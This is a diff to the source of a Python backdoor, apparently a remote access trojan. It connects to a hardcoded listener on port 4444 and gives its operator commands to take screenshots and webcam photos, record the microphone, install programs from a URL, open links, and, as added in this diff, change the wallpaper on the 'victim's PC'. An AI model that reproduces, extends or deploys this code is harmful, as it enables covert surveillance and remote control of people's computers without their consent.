@@ -23,21 +23,22 @@ from cv2 import imshow, imwrite, destroyWindow, waitKey
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-ip = "192.168.1.6"
+ip = "192.168.1.7"
 port = 4444
 ipadd = get('https://api.ipify.org').text
 
 class back:
     def help_desk(self):
-        self.help_ = ("===============================================================\n"+
-                    "|| 1.) bye                 -- To close the session             ||\n"+
-                    "|| 2.) screen -webhook     -- To take screenshot.              ||\n"+
-                    "|| 3.) webcam -webhook     -- To take webcam photo.            ||\n"+
-                    "|| 4.) record t c freq web -- To record sound from Mic.        ||\n"+
-                    "|| 5.) list                -- To list the process id.          ||\n"+
-                    "|| 6.) install             -- To install any program.          ||\n"+
-                    "|| 7.) open -link          -- To open any url on victim's PC   ||\n"+
-                    "===============================================================\n")
+        self.help_ = ("=================================================================================\n"+
+                    "|| 1.) bye                         -- To close the session.                     ||\n"+
+                    "|| 2.) screen -webhook             -- To take screenshot.                       ||\n"+
+                    "|| 3.) webcam -webhook             -- To take webcam photo.                     ||\n"+
+                    "|| 4.) record -t -c -freq -webhook -- To record sound from Mic.                 ||\n"+
+                    "|| 5.) list                        -- To list the process id.                   ||\n"+
+                    "|| 6.) install -url                -- To install any program.                   ||\n"+
+                    "|| 7.) open -link                  -- To open any url on victim's PC.           ||\n"+
+                    "|| 8.) wallpaper -path             -- Changes the wallpaper of the victim's PC. ||\n"+
+                    "=================================================================================\n")
         s.send(self.help_.encode())
 
     def screenshot(self, url):
@@ -133,6 +134,11 @@ class back:
             
             elif (cmd[:4] == "list"):
                 self.process_id()
+
+            elif (cmd[:9] == "wallpaper"):
+                time.sleep(0.1)
+                x = cmd[10:-1]
+                ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{x}" , 0)
 
             elif (cmd[:6] == "record"):
                 s.send(b"\n[+] 44100 frequency is recommended!!\n[+] Channel 2 is recommended!!\n")
